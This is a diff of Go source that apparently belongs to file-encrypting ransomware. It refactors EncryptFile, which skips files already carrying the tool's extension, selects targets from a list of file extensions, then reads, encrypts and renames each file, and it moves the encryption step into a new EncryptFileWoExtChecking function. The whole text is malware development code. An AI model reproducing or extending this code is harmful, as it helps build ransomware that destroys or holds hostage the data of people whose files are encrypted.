@@ -78,30 +78,8 @@ func Decrypt(key, data []byte) []byte {
 	return decrypted
 }
 
-func EncryptFile(path string, key []byte) error {
-	if strings.HasSuffix(path, extension) {
-		return nil
-	}
-
-	//This should be a compile time constant so code should get optimized by the compiler
-	//Check if the current's file extension is in the dict or list
-	if UseDict {
-		if extensionDict[GetFileExtensionFastest(path)] != 1 {
-			return nil
-		}
-	} else {
-		Len, Extension := len(extensionsSlice), GetFileExtensionFastest(path)
-		ok := 0
-		for i := 0; i < Len; i++ {
-			if extensionsSlice[i] == Extension {
-				ok = 1
-			}
-		}
-		if ok == 0 {
-			return nil
-		}
-	}
-
+// Encrypts the file without checking first if the extension isn't "extension" or in the ext list/dict
+func EncryptFileWoExtChecking(path string, key []byte) error {
 	data, err := ioutil.ReadFile(path)
 	if err != nil {
 		//Think of a fix, if the error isn't nil the walk function exits, so we return nil even on errors
@@ -125,6 +103,32 @@ func EncryptFile(path string, key []byte) error {
 	err = os.Rename(path, sb.String())
 	fmt.Println(err)
 	return nil
+}
+
+func EncryptFile(path string, key []byte) error {
+	if strings.HasSuffix(path, extension) {
+		return nil
+	}
+
+	//Check if the current's file extension is in the dict or list
+	if UseDict {
+		if extensionDict[GetFileExtensionFastest(path)] != 1 {
+			return nil
+		}
+	} else {
+		Len, Extension := len(extensionsSlice), GetFileExtensionFastest(path)
+		ok := 0
+		for i := 0; i < Len; i++ {
+			if extensionsSlice[i] == Extension {
+				ok = 1
+			}
+		}
+		if ok == 0 {
+			return nil
+		}
+	}
+
+	return EncryptFileWoExtChecking(path, key)
 }
 
 func DecryptFile(path string, key []byte) error {
